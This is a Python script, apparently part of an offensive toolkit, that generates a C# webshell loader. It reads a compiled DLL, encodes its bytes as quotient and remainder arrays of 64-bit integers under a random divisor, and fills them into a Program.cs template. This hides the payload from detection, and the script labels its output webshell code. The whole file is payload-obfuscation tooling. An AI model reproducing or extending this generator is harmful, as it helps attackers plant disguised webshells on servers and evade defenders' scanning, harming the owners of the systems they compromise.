import random
from struct import unpack
import hashlib
import os
from itertools import cycle
import io

class Generate():

    __endian_type = ''

    __templates_path = "ULONGTEA"
    __output_path = __templates_path + '/' + "Program.cs"

    def __init__(self,endian_type, output):
        self.__endian_type = endian_type
        if output is not None:
            self.__output_path = output

    def __get_template_code(self):
        template_path = self.__templates_path + '/' + "Program.cs.template"
        with open(template_path, 'r') as file_handle:
            template_code = file_handle.read()
        return template_code

    def __generate_webshell_code_ulong_compression(self, template_code):
        def get_dll_code(dll_code_path):
            with open(dll_code_path, 'rb') as file_handle:
                dll_code = file_handle.read()
            return dll_code

        def get_ulong_arrays(dll_code, divisor, endian_type):
            ulong_quotients = []
            ulong_remainders = []
            if endian_type == 'little':
                representation = '<'
            elif endian_type == 'big':
                representation = '>'
            else:
                representation = '='
            for i in range(0, len(dll_code), 8):
                int_conversion = unpack(representation + 'Q', dll_code[i:i + 8])[0]
                ulong_quotients.append(str(int_conversion // divisor))
                ulong_remainders.append(str(int_conversion % divisor))
            ulong_quotients_string = '{' + ','.join(ulong_quotients) + '}'
            ulong_remainders_string = '{' + ','.join(ulong_remainders) + '}'
            return ulong_quotients_string, ulong_remainders_string

        runtime_compiler_dll_path = "InnerStage/bin/Debug/InnerStage.dll"
        dll_code = get_dll_code(runtime_compiler_dll_path)
        divisor = random.randint(2,1000000)
        ulong_quotients, ulong_remainders = get_ulong_arrays(dll_code, divisor, self.__endian_type)
        webshell_code = template_code.replace('{{Placeholder_ulong_arr}}', ulong_quotients)
        webshell_code = webshell_code.replace('{{Placeholder_remainders}}', ulong_remainders)
        webshell_code = webshell_code.replace('{{Placeholder_divisor}}', str(divisor))
        return webshell_code

    def generate(self):
        template_code = self.__get_template_code()
        webshell_code = self.__generate_webshell_code_ulong_compression(template_code)
        webshell_output_path = self.__output_path
        with open(webshell_output_path, 'w') as file_handle:
            file_handle.write(webshell_code)
        print ('Loader written to: ' + webshell_output_path)



# encryption = 'xor', 'aes128', 'aes256'
g = Generate('little', None)
g.generate()